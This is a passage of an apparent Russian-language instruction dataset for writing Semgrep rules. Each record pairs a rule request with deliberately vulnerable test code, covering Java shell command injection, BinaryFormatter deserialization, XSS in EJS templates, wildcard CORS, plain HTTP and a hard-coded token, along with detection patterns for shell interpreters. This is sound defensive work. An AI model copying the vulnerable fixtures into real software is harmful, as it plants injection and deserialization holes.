ruleid: command-injection-formatted-runtime-call\n        Runtime.getRuntime().exec(command, envp, input);\n    }\n\n        public void test6(String input) {\n        String[] command = new String[]{\"bash\"};\n        // ruleid: command-injection-formatted-runtime-call\n        Runtime.getRuntime().exec(command, \"-c\",   # Ограничиваем длину\n\nОпасные паттерны:\n• r.exec('/bin/sh -c some_tool' + input);\n• r.loadLibrary(String.format(\\\n• , input));\n\nБезопасные паттерны:  \n• r.exec(\\\n• );\n• Runtime.getRuntime().loadLibrary(\\\n\nЛегенда аннотаций:\n- // ruleid:command-injection-formatted-runtime-call: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:command-injection-formatted-runtime-call: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: command-injection-formatted-runtime-call\n  patterns:\n  - metavariable-pattern:\n      metavariable: $RUNTIME\n      patterns:\n      - pattern-either:\n        - pattern: (java.lang.Runtime $R)\n        - pattern: java.lang.Runtime.getRuntime(...)\n  - pattern-either:\n    - pattern: $RUNTIME.exec($X + $Y);\n    - pattern: $RUNTIME.exec(String.format(...));\n    - pattern: $RUNTIME.loadLibrary($X + $Y);\n    - pattern: $RUNTIME.loadLibrary(String.format(...));\n    - patterns:\n      - pattern-either:\n        - pattern: | \n            $RUNTIME.exec(\"=~/(sh|bash|ksh|csh|tcsh|zsh)/\", \"-c\", $ARG,...)\n        - pattern: |\n            $RUNTIME.exec(Arrays.asList(\"=~/(sh|bash|ksh|csh|tcsh|zsh)/\",\"-c\",$ARG,...),...)\n        - pattern: |\n            $RUNTIME.exec(new String[]{\"=~/(sh|bash|ksh|csh|tcsh|zsh)/\",\"-c\",$ARG,...},...)\n        - patterns:\n          - pattern-either:\n            - pattern: |\n                $RUNTIME.exec($CMD,\"-c\",$ARG,...)\n            - pattern: |\n                $RUNTIME.exec(Arrays.asList($CMD,\"-c\",$ARG,...),...)\n            - pattern: |\n                $RUNTIME.exec(new String[]{$CMD,\"-c\",$ARG,...},...)\n          - pattern-inside: |\n              $CMD = \"=~/(sh|bash|ksh|csh|tcsh|zsh)/\";\n              ...\n        - patterns:\n          - pattern-either:\n            - pattern: |\n                $RUNTIME.exec($CMD, $EXECUTE, $ARG, ...)\n          - pattern-inside: |\n              $CMD = new String[]{\"=~/(sh|bash|ksh|csh|tcsh|zsh)/\", ...};\n              ...\n        - patterns:\n            - pattern-either:\n                - pattern: | \n                    $RUNTIME.exec(\"=~/(sh|bash|ksh|csh|tcsh|zsh)/\", $BASH, $ARG,...)\n                - pattern: |\n                    $RUNTIME.exec(Arrays.asList(\"=~/(sh|bash|ksh|csh|tcsh|zsh)/\",$BASH,$ARG,...),...)\n                - pattern: |\n                    $RUNTIME.exec(new String[]{\"=~/(sh|bash|ksh|csh|tcsh|zsh)/\",$BASH,$ARG,...},...)\n            - pattern-inside: |\n                $BASH = new String[]{\"=~/(-c)/\", ...};\n                ...\n      - pattern-not-inside: |\n          $ARG = \"...\";\n          ...\n      - pattern-not: |\n          $RUNTIME.exec(\"...\",\"...\",\"...\",...)\n      - pattern-not: |\n          $RUNTIME.exec(new String[]{\"...\",\"...\",\"...\",...},...)\n      - pattern-not: |\n          $RUNTIME.exec(Arrays.asList(\"...\",\"...\",\"...\",...),...)\n  message: >-\n    A formatted or concatenated string was detected as input to a java.lang.Runtime\n    call.\n    This is dangerous if a variable is controlled by user input and could result in\n    a\n    command injection. Ensure your variables are not controlled by users or sufficiently\n    sanitized.\n  metadata:\n    cwe:\n    - \"CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\"\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    source-rule-url: https://find-sec-bugs.github.io/bugs.htm#COMMAND_INJECTION.\n    category: security\n    technology:\n    - java\n    references:\n    - https://owasp.org/Top10/A03_2021-Injection\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: HIGH\n    confidence: LOW\n  severity: ERROR\n  languages:\n  - java\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска уязвимостей command-injection-formatted-runtime-call в Java-коде. Оно ищет случаи, когда объект класса java.lang.Runtime используется для выполнения команд или загрузки библиотек, при этом строковые аргументы формируются путем конкатенации или форматирования, что может привести к выполнению произвольных команд. Правило проверяет методы exec() и loadLibrary(), а также использует регулярные выражения для выявления потенциально опасных команд, таких как bash, sh и другие оболочки. Паттерны включают проверки на наличие переменных, которые могут быть контролируемы пользователем, и исключают безопасные вызовы, где аргументы жестко закодированы.\n\n# Ключевые элементы:\n- ID: command-injection-formatted-runtime-call\n- Язык: java \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "command-injection-formatted-runtime-call",
      "language": "java",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: missing-dnf-assume-yes-switch\nОписание уязвимости: This 'dnf install' is missing the '-y' switch. This might stall builds because it requires human intervention. Add the '-y' switch.\nCWE: \nТип анализа: search\nЯзык: dockerfile",
    "input": "Требования:\n- Язык: dockerfile\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: missing-dnf-assume-yes-switch.dockerfile\n# cf. https://github.com/hadolint/hadolint/wiki/DL3038\n\nFROM centos\n# ruleid: missing-dnf-assume-yes-switch\nRUN dnf install httpd-2.24.4 && dnf clean all\n\n# ok: missing-dnf-assume-yes-switch\nRUN dnf install -y httpd-2.24.4 && dnf clean all\n\n# ok: missing-dnf-assume-yes-switch\nRUN dnf install --downloadonly -y httpd-2.24.4 python\n\n# ok: missing-dnf-assume-yes-switch\nRUN dnfinstall -y httpd-2.24.4\n\n# ok: missing-dnf-assume-yes-switch\nRUN dnf install -y --downloadonly \\\n    python3 \\\n    python3-pip \\\n    && dnf clean all\n\n# ruleid: missing-dnf-assume-yes-switch\nRUN dnf install --downloadonly \\\n    python3 \\\n    python3-pip \\\n    && dnf clean all\n\n# ok: missing-dnf-assume-yes-switch\nRUN dnf install --assumeyes \\\n    --downloadonly \\\n    python3 \\\n    python3-pip \\\n    && dnf clean all  # Ограничиваем длину\n\nОпасные паттерны:\n• RUN dnf install httpd-2.24.4 && dnf clean all\n• RUN dnf install --downloadonly \\\n    python3 \\\n    python3-pip \\\n    && dnf clean all\n\nБезопасные паттерны:  \n• RUN dnf install -y httpd-2.24.4 && dnf clean all\n• RUN dnf install --downloadonly -y httpd-2.24.4 python\n• RUN dnfinstall -y httpd-2.24.4\n\nЛегенда аннотаций:\n- // ruleid:missing-dnf-assume-yes-switch: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:missing-dnf-assume-yes-switch: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: missing-dnf-assume-yes-switch\n    severity: WARNING\n    languages: [dockerfile]\n    patterns:\n      - pattern: |\n          RUN ... dnf install ...\n      - pattern-not-inside: |\n          RUN ... dnf install ... -y ...\n      - pattern-not-inside: |\n          RUN ... dnf ... --assumeyes ...\n    message: >-\n      This 'dnf install' is missing the '-y' switch. This might stall\n      builds because it requires human intervention. Add the '-y' switch.\n    metadata:\n      source-rule-url: https://github.com/hadolint/hadolint/wiki/DL3038\n      references:\n        - https://github.com/hadolint/hadolint/wiki/DL3038\n      category: best-practice\n      technology:\n        - dockerfile\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска инструкций Dockerfile, использующих команду 'RUN dnf install', которая не включает опцию '-y'. Паттерн ищет строки, содержащие 'RUN dnf install', но исключает случаи, когда эта команда явно содержит '-y' или '--assumeyes'. Это позволяет обнаружить ситуации, где требуется вмешательство человека для завершения установки пакетов.\n\n# Ключевые элементы:\n- ID: missing-dnf-assume-yes-switch\n- Язык: dockerfile \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "missing-dnf-assume-yes-switch",
      "language": "dockerfile",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: insecure-binaryformatter-deserialization\nОписание уязвимости: The BinaryFormatter type is dangerous and is not recommended for data processing. Applications should stop using BinaryFormatter as soon as possible, even if they believe the data they're processing to be trustworthy. BinaryFormatter is insecure and can't be made secure\nCWE: CWE-502: Deserialization of Untrusted Data\nТип анализа: search\nЯзык: C#",
    "input": "Требования:\n- Язык: C#\n- Тип анализа: search\n- CWE: CWE-502: Deserialization of Untrusted Data\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: binary-formatter.cs\nusing System.Runtime.Serialization.Formatters.Binary;\n\nnamespace InsecureDeserialization\n{\n    public class InsecureBinaryFormatterDeserialization\n    {\n        public void BinaryFormatterDeserialization(string json)\n        {\n            try\n            {\n                // ruleid: insecure-binaryformatter-deserialization\n                BinaryFormatter binaryFormatter = new BinaryFormatter();\n\n                MemoryStream memoryStream = new MemoryStream(Encoding.UTF8.GetBytes(json));\n                binaryFormatter.Deserialize(memoryStream);\n                memoryStream.Close();\n            }\n            catch (Exception e)\n            {\n                Console.WriteLine(e);\n            }\n        }\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• using System.Runtime.Serialization.Formatters.Binary;\r\n...\r\nBinaryFormatter binaryFormatter = new BinaryFormatter();\n• using System.Runtime.Serialization.Formatters.Binary;\r\n...\r\nvar formatter = new BinaryFormatter();\n\nБезопасные паттерны:  \n• using System.Runtime.Serialization.Formatters.Binary;\r\n...\r\nISerializer serializer = new XmlSerializer(typeof(MyClass));\n• using System.Runtime.Serialization.Formatters.Binary;\r\n...\r\nMemoryStream stream = new MemoryStream();\n\nЛегенда аннотаций:\n- // ruleid:insecure-binaryformatter-deserialization: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:insecure-binaryformatter-deserialization: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: insecure-binaryformatter-deserialization\n  severity: WARNING\n  languages:\n  - C#\n  metadata:\n    cwe:\n    - 'CWE-502: Deserialization of Untrusted Data'\n    owasp:\n    - A08:2017 - Insecure Deserialization\n    - A08:2021 - Software and Data Integrity Failures\n    references:\n    - https://docs.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide\n    category: security\n    technology:\n    - .net\n    confidence: HIGH\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: HIGH\n  message: >-\n    The BinaryFormatter type is dangerous and is not recommended for data processing. Applications should\n    stop using BinaryFormatter\n    as soon as possible, even if they believe the data they're processing to be trustworthy. BinaryFormatter\n    is insecure and can't be made secure\n  patterns:\n  - pattern-inside: |\n      using System.Runtime.Serialization.Formatters.Binary;\n      ...\n  - pattern: |\n      new BinaryFormatter();\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования типа BinaryFormatter в C# коде. Анализ выполняется путем поиска конструкции 'using System.Runtime.Serialization.Formatters.Binary;' внутри исходного кода и последующего поиска вызова конструктора 'new BinaryFormatter()'. Это позволяет обнаружить потенциальную уязвимость, связанную с десериализацией недоверенных данных.\n\n# Ключевые элементы:\n- ID: insecure-binaryformatter-deserialization\n- Язык: C# \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "insecure-binaryformatter-deserialization",
      "language": "C#",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: var-in-script-tag\nОписание уязвимости: Detected a template variable used in a script tag. Although template variables are HTML escaped, HTML escaping does not always prevent cross-site scripting (XSS) attacks when used directly in JavaScript. If you need this data on the rendered page, consider placing it in the HTML portion (outside of a script tag). Alternatively, use a JavaScript-specific encoder, such as the one available in OWASP ESAPI.\nCWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nТип анализа: search\nЯзык: generic",
    "input": "Требования:\n- Язык: generic\n- Тип анализа: search\n- CWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: var-in-script-tag.ejs\n<!-- cf. https://github.com/caiomartini/mustache-demo/blob/97b9200ebd2d27953febff23e6718aa1aa9ee44d/demo-mustache.html -->\n<!DOCTYPE HTML>\n<html>\n\n<head>\n    <title>Demo Mustache.JS</title>\n    <meta charset=\"utf-8\">\n    <link rel=\"stylesheet\" href=\"node_modules\\bootstrap\\dist\\css\\bootstrap.min.css\">\n    <script type=\"text/javascript\" src=\"node_modules\\jquery\\dist\\jquery.min.js\"></script>\n    <script type=\"text/javascript\" src=\"node_modules\\bootstrap\\dist\\js\\bootstrap.min.js\"></script>\n    <script type=\"text/javascript\" src=\"node_modules\\mustache\\mustache.min.js\"></script>\n    <script type=\"text/javascript\" src=\"demo-mustache.js\"></script>\n</head>\n\n<body onload=\"carregarDemo();\">\n    <div class=\"content\">\n        <div id=\"mustache-header\"></div>\n        <div id=\"mustache-cards\"></div>\n    </div>\n</body>\n\n<script type=\"text/javascript\">\n    <!-- ruleid: var-in-script-tag -->\n    var message = <%= message %>;\n</script>\n\n<script type=\"text/javascript\">\n    <!-- ruleid: var-in-script-tag -->\n    var message = <%= message %>;\n    console.log(message);\n    console.log(\"more statements here\");\n    <!-- ruleid: var-in-script-tag -->\n    var message2 = <%= message2 %>;\n    var flash = document.getElementById(\"flash\");\n    flash.text = message;\n</script>\n\n<script src=\"app.js\"></script>\n<!-- ok: var-in-script-tag -->\n<%= title %>\n<script src=\"script.js\"></script>\n\n<div class=\"text-center\">\n    <h2>Apresentando o time da <b><%= time.nome %></b></h2>\n    <h6>Predio <%= time.predio %></h6>\n</div>\n<div class=\"container\" style=\"margin-top: 30px;\">\n    <div class=\"row\">\n        <div class=\"col-sm-6\">\n            <div class=\"card\">\n                <div class=\"card-header text-center\">\n                    <b><%= nome %></b>\n                </div>\n                <div class=\"card-body\">\n                    <%= template-table %>\n                </div>\n            </div>\n        </div>\n    </div>\n</div>\n\n<!-- ok: var-in-script-tag -->\n<script src=\"./<%=reac  # Ограничиваем длину\n\nОпасные паттерны:\n• <script type=\"text/javascript\">var message = <%= message %>;</script>\n• <script type=\"text/javascript\">var message = <%= message %>;console.log(message);</script>\n\nБезопасные паттерны:  \n• <script type=\"text/javascript\" $ATTR=\"...\">...</script>\n• <script type=\"text/javascript\">var message = \"<%= message %>\";</script>\n\nЛегенда аннотаций:\n- // ruleid:var-in-script-tag: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:var-in-script-tag: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: var-in-script-tag\n  message: >-\n    Detected a template variable used in a script tag.\n    Although template variables are HTML escaped, HTML\n    escaping does not always prevent cross-site scripting (XSS)\n    attacks when used directly in JavaScript. If you need this\n    data on the rendered page, consider placing it in the HTML\n    portion (outside of a script tag). Alternatively, use a\n    JavaScript-specific encoder, such as the one available\n    in OWASP ESAPI.\n  metadata:\n    cwe:\n    - \"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"\n    owasp:\n    - A07:2017 - Cross-Site Scripting (XSS)\n    - A03:2021 - Injection\n    references:\n    - https://www.veracode.com/blog/secure-development/nodejs-template-engines-why-default-encoders-are-not-enough\n    - https://github.com/ESAPI/owasp-esapi-js\n    category: security\n    technology:\n    - express\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n  languages:\n  - generic\n  severity: WARNING\n  patterns:\n  - pattern-inside: <script ...> ... </script>\n  - pattern-not-inside: <script ... $ATTR = \"...\" ...>\n  - pattern-not-inside: <script ... $ATTR = '...' ...>\n  - pattern: <% ... >\n  paths:\n    include:\n    - '*.ejs'\n    - '*.html'\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования переменных шаблонов внутри тегов скриптов (<script>...</script>) в файлах ejs или html. Паттерн ищет текст внутри тега скрипта, который начинается с '<%' и не содержит атрибутов стиля ($ATTR) в виде '=' с двойными или одинарными кавычками. Это позволяет обнаружить случаи, когда данные шаблона напрямую вставляются в скриптовый блок, что может привести к XSS-уязвимостям.\n\n# Ключевые элементы:\n- ID: var-in-script-tag\n- Язык: generic \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "var-in-script-tag",
      "language": "generic",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: digitalocean-access-token\nОписание уязвимости: A gitleaks digitalocean-access-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: digitalocean-access-token.go\n// ruleid: digitalocean-access-token\ndo_api_token = \"doo_v1_01668ac5824f09ce908aaff8bf60e08c375e707f36b73dd2df0994887bbb9799\"  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: digitalocean-access-token.go\n// ruleid: digitalocean-access-token\ndoo_v1_01668ac5824f09ce908aaff8bf60e08c375e707f36b73dd2df0994887bbb9799 = apiToken\n• // File: config.yaml\ngithub_access_token: doo_v1_ef3456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789\n\nБезопасные паттерны:  \n• // File: constants.go\nconst API_TOKEN string = os.Getenv(\"DOO_V1_API_TOKEN\")\n• // File: main.go\napiToken := getSecureApiTokenFromVault()\n\nЛегенда аннотаций:\n- // ruleid:digitalocean-access-token: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:digitalocean-access-token: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: digitalocean-access-token\n  message: A gitleaks digitalocean-access-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: (?i)\\b(doo_v1_[a-f0-9]{64})(?:['|\\\"|\\n|\\r|\\s|\\x60|;]|$)\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированного токена доступа DigitalOcean в виде строки, начинающейся с 'doo_v1_' за которой следует последовательность из 64 шестнадцатеричных символов. Правило ищет эту строку в любом контексте, где она может быть окружена разделителями ('', \"\", \n, \r, пробел или обратная кавычка), либо непосредственно перед концом строки. Это позволяет обнаружить случаи, когда токены доступа хранятся прямо в исходном коде, что является небезопасной практикой.\n\n# Ключевые элементы:\n- ID: digitalocean-access-token\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "digitalocean-access-token",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения nestjs-header-cors-any\nОписание уязвимости: Access-Control-Allow-Origin response header is set to \"*\". This will disable CORS Same Origin Policy restrictions.\nCWE: CWE-183: Permissive List of Allowed Inputs\nТип анализа: search\nЯзык: typescript",
    "input": "Требования:\n- Язык: typescript\n- Тип анализа: search\n- CWE: CWE-183: Permissive List of Allowed Inputs\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: nestjs-header-cors-any.ts\nimport { Controller, Get, Header } from '@nestjs/common';\nimport { NestFactory } from '@nestjs/core';\nimport { AppService } from './app.service';\nimport { AppModule } from './app.module';\n\nasync function bootstrap1() {\n  // ruleid:nestjs-header-cors-any\n  const app = await NestFactory.create(AppModule, {cors: true});\n  await app.listen(3000);\n}\n\nasync function bootstrap2() {\n  const app = await NestFactory.create(AppModule);\n  // ruleid:nestjs-header-cors-any\n  app.enableCors();\n  await app.listen(3000);\n}\n\nasync function bootstrap3() {\n  // ruleid:nestjs-header-cors-any\n  const app = await NestFactory.create(AppModule, {cors: {origin: '*'}});\n  await app.listen(3000);\n}\n\nasync function bootstrap4() {\n  const app = await NestFactory.create(AppModule);\n  // ruleid:nestjs-header-cors-any\n  app.enableCors({origin: '*'});\n  await app.listen(3000);\n}\n\nasync function bootstrap5() {\n  const app = await NestFactory.create(AppModule);\n  // ok:nestjs-header-cors-any\n  app.enableCors({origin: 'google.com'});\n  await app.listen(3000);\n}\n\n// ruleid:nestjs-header-cors-any\n@Controller()\nexport class AppController1 {\n  constructor(private readonly appService: AppService) {}\n\n  @Get()\n  @Header('Access-Control-Allow-Origin', '*')\n  testCtrl1(): string {\n    return this.appService.getHello();\n  }\n\n}\n\n// ruleid:nestjs-header-cors-any\n@Controller()\nexport class AppController2 {\n  constructor(private readonly appService: AppService) {}\n\n  @Get()\n  @Header('access-control-allow-origin', '*')\n  testCtrl2(): string {\n    return this.appService.getHello();\n  }\n}\n\n// ok:nestjs-header-cors-any\n@Controller()\nexport class AppController3 {\n  constructor(private readonly appService: AppService) {}\n\n  @Get()\n  @Header('Access-Control-Allow-Origin', 'google.com')\n  testCtrlOk(): string {\n    return this.appService.getHello();\n  }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• const app = await NestFactory.create(AppModule, {cors: true});\n• app.enableCors();\n• @Header(\\\n\nБезопасные паттерны:  \n• const app = await NestFactory.create(AppModule);\n• app.enableCors({origin: 'google.com'});\n• @Header('Access-Control-Allow-Origin', 'google.com')\n\nЛегенда аннотаций:\n- // ruleid:nestjs-header-cors-any: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:nestjs-header-cors-any: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: nestjs-header-cors-any\n  message: >-\n    Access-Control-Allow-Origin response header is set to \"*\". This will disable CORS Same Origin Policy\n    restrictions.\n  metadata:\n    cwe:\n    - 'CWE-183: Permissive List of Allowed Inputs'\n    asvs:\n      section: 'V14: Configuration Verification Requirements'\n      control_id: 14.4.8 Permissive CORS\n      control_url: https://github.com/OWASP/ASVS/blob/master/4.0/en/0x22-V14-Config.md#v144-http-security-headers-requirements\n      version: '4'\n    category: security\n    technology:\n    - nestjs\n    owasp:\n    - A04:2021 - Insecure Design\n    references:\n    - https://owasp.org/Top10/A04_2021-Insecure_Design\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages:\n  - typescript\n  severity: WARNING\n  pattern-either:\n  - pattern: |\n      class $CN {\n          @Header(\"=~/[Aa][Cc][Cc][Ee][Ss][Ss]-[Cc][Oo][Nn][Tt][Rr][Oo][Ll]-[Aa][Ll][Ll][Oo][Ww]-[Oo][Rr][Ii][Gg][Ii][Nn]/\", '*')\n          $FN(...) {\n              ...\n          }\n      }\n  - pattern: |\n      NestFactory.create($MODULE, {cors: true})\n  - pattern: |\n      NestFactory.create($MODULE, {cors: {origin: '*'}})\n  - pattern: |\n      $APP.enableCors()\n  - pattern: |\n      $APP.enableCors({origin: '*'})\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска случаев, когда заголовок Access-Control-Allow-Origin устанавливается в значение \\\n\n# Ключевые элементы:\n- ID: nestjs-header-cors-any\n- Язык: typescript \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "nestjs-header-cors-any",
      "language": "typescript",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения httpurlconnection-http-request\nОписание уязвимости: Detected an HTTP request sent via HttpURLConnection. This could lead to sensitive information being sent over an insecure channel. Instead, it is recommended to send requests over HTTPS.\nCWE: C\nТип анализа: search\nЯзык: java",
    "input": "Требования:\n- Язык: java\n- Тип анализа: search\n- CWE: C\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: httpurlconnection-http-request.java\nclass Bad {\n    private static void sendbad1() throws IOException {\n            // ruleid: httpurlconnection-http-request\n            URL obj = new URL(\"http://example.com\");\n            HttpURLConnection con = (HttpURLConnection) obj.openConnection();\n            con.setRequestMethod(\"GET\");\n            con.setRequestProperty(\"User-Agent\", USER_AGENT);\n            int responseCode = con.getResponseCode();\n            con.connect();\n    }\n\n    private static void sendbad2() throws IOException {\n            String url = \"http://example.com\";\n            // ruleid: httpurlconnection-http-request\n            URL obj = new URL(url);\n            HttpURLConnection con = (HttpURLConnection) obj.openConnection();\n            con.setRequestMethod(\"GET\");\n            con.setRequestProperty(\"User-Agent\", USER_AGENT);\n            int responseCode = con.getResponseCode();\n            con.connect();\n    }\n\n    public static void sendbad3() throws IOException {\n            String url = \"http://example.com\";\n            // ruleid: httpurlconnection-http-request\n            URL urlObj = new URL(url);\n            URLConnection urlCon = urlObj.openConnection();\n            InputStream inputStream = urlCon.getInputStream();\n    }\n\n    public static void sendbad4() throws IOException {\n            // ruleid: httpurlconnection-http-request\n            URL urlObj = new URL(\"http://example.com\");\n            URLConnection urlCon = urlObj.openConnection();\n            int responseCode = urlCon.getResponseCode();\n    }\n}\n\npublic class Ok {\n    private static void sendok1() throws IOException {\n            // ok: httpurlconnection-http-request\n            URL obj = new URL(\"https://example.com\");\n            HttpURLConnection con = (HttpURLConnection) obj.openConnection();\n            con.setRequestMethod(\"GET\");\n            con.setRequestProperty(\"User-Agent\", USER_AGENT);\n            int responseCode = con.getResponseCode();\n            con.conne  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: httpurlconnection-http-request.java\nclass Bad {\n    private static void sendbad1() throws IOException {\n            // ruleid: httpurlconnection-http-request\n            URL obj = new URL(\"ht\n• // File: httpurlconnection-http-request.java\nclass Bad {\n    private static void sendbad2() throws IOException {\n            String url = \"http://example.com\";\n            // ruleid: httpurlconnection\n• // File: httpurlconnection-http-request.java\nclass Bad {\n    public static void sendbad3() throws IOException {\n            String url = \"http://example.com\";\n            // ruleid: httpurlconnection-\n\nБезопасные паттерны:  \n• // File: httpurlconnection-http-request.java\npublic class Ok {\n    private static void sendok1() throws IOException {\n            // ok: httpurlconnection-http-request\n            URL obj = new URL(\"h\n• // File: httpurlconnection-http-request.java\npublic class Ok {\n    private static void sendok2() throws IOException {\n            String url = \"https://example.com\";\n            // ok: httpurlconnecti\n• // File: httpurlconnection-http-request.java\npublic class Ok {\n    public static void sendok3() throws IOException {\n            String url = \"https://example.com\";\n            // ok: httpurlconnectio\n\nЛегенда аннотаций:\n- // ruleid:httpurlconnection-http-request: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:httpurlconnection-http-request: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: httpurlconnection-http-request\n  message: >-\n    Detected an HTTP request sent via HttpURLConnection.\n    This could lead to sensitive information\n    being sent over an insecure channel.\n    Instead, it is recommended to send requests over HTTPS.\n  severity: WARNING\n  metadata:\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n    category: security\n    cwe: 'CWE-319: Cleartext Transmission of Sensitive Information'\n    owasp: 'A03:2017 - Sensitive Data Exposure'\n    references:\n    - https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/net/URLConnection.html\n    - https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/net/URL.html#openConnection()\n    subcategory:\n    - vuln\n    technology:\n    - java\n    vulnerability: Insecure Transport\n  languages:\n  - java\n  fix-regex:\n    regex: '[Hh][Tt][Tt][Pp]://'\n    replacement: https://\n    count: 1\n  patterns:\n  - pattern: |\n      \"=~/[Hh][Tt][Tt][Pp]://.*/\"\n  - pattern-either:\n    - pattern-inside: |\n        URL $URL = new URL (\"=~/[Hh][Tt][Tt][Pp]://.*/\", ...);\n        ...\n        $CON = (HttpURLConnection) $URL.openConnection(...);\n        ...\n        $CON.$FUNC(...);\n    - pattern-inside: |\n        URL $URL = new URL (\"=~/[Hh][Tt][Tt][Pp]://.*/\", ...);\n        ...\n        $CON = $URL.openConnection(...);\n        ...\n        $CON.$FUNC(...);\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования класса HttpURLConnection для отправки HTTP-запросов через незащищенный канал. Анализируется создание объекта URL с использованием протокола HTTP ('http://') и последующая инициализация соединения через openConnection(). Паттерны используют регулярные выражения для соответствия строкам, начинающимся с 'http://', и проверяют наличие вызова метода openConnection(), который может быть использован для создания небезопасного соединения.\n\n# Ключевые элементы:\n- ID: httpurlconnection-http-request\n- Язык: java \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "httpurlconnection-http-request",
      "language": "java",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
